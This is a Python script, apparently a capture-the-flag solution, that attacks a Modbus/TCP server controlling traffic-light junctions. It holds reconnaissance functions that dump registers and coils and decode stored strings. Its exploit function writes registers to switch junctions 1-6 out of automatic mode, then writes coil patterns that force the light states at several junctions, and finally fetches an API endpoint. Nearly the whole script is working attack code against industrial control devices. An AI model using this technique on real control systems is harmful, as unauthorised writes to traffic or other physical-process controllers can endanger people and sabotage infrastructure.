from pyModbusTCP.client import ModbusClient
import requests


ip = <TARGET IP>


def exploit():
	# Disable auto mode at all junctions.
	for uid in range(1,7):
		c = ModbusClient(host=ip, port=502, unit_id=uid, auto_open=True)
		man_mode = list(map(lambda x : ord(x),['f','a','l','s','e']))
		c.write_multiple_registers(10,man_mode)

	# Junction 1
	c = ModbusClient(host=ip, port=502, unit_id=1)
	c.open()
	c.write_multiple_coils(571, [False,False,True,False,False,True,False,False,True,True,False,False])
	c.close()

	# Junction 2
	c = ModbusClient(host=ip, port=502, unit_id=2, auto_open=True)
	c.write_multiple_coils(1920,[True,False,False,False,False,True,False,False,True,False,False,True])
	c.close()

	# Junction 4
	c = ModbusClient(host=ip, port=502, unit_id=4, auto_open=True)
	c.write_multiple_coils(1266,[False,False,True,False,False,True,False,False,True,True,False,False])
	c.close

	# Junction 6
	c = ModbusClient(host=ip, port=502, unit_id=6, auto_open=True)
	c.write_multiple_coils(886,[False,False,True,False,False,True,False,False,True,True,False,False])
	c.close()

def query_api():
	data = requests.get(f'http://{ip}/api').text
	print(data)


# Exploring the initial state of the server registers and coils.
def read_state():
	for uid in range(0,10):
		print(f"Unit id {uid}:")
		c = ModbusClient(host=ip, port=502, unit_id=uid, auto_open=True)
		holding_regs = c.read_holding_registers(0, 30)
	#	print(holding_regs)
		coils = c.read_coils(1,2000)
		print(coils)

# Decode string stored in registers.
def decode_register_values():
	c = ModbusClient(host=ip, port=502, unit_id=1, auto_open=True)
	ret_arr = c.read_holding_registers(0, 20)
	print(list(map(lambda x : chr(x),ret_arr)))


# Printing the indices of enabled coils.
def find_offsets():
	for uid in range(1,7):
		print(f"Unit id {uid}:")
		c = ModbusClient(host=ip, port=502, unit_id=uid, auto_open=True)
		coils = c.read_coils(1,2000)
		for (i,value) in enumerate(coils,1):
			if value == True:
				print(i)


# read_state()
# decode_register_values()
# find_offsets()
exploit()
query_api()
